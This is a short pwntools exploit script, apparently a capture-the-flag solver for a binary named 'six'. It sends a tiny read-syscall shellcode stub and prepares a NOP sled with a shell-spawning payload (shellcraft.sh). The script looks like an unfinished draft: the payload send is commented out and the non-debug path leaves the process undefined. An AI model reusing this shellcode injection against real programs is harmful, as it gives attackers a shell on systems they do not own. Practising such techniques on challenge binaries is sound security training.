from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./six_test")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}\nb *{b2}".format(b1=hex(code_base+0xC95),b2=hex(code_base +0xB82)))

context.arch = "amd64"
context.terminal = ["tmux","splitw","-v"]
code = """
push rsp
pop rsi
mov edx,esi
syscall
"""
debugf()
print asm(code).encode("hex")
sc = "\x90"*0xb36 + asm(shellcraft.sh())
p.sendafter("Show Ne0 your shellcode:\n",asm(code))
#p.sendline(sc)
p.interactive()
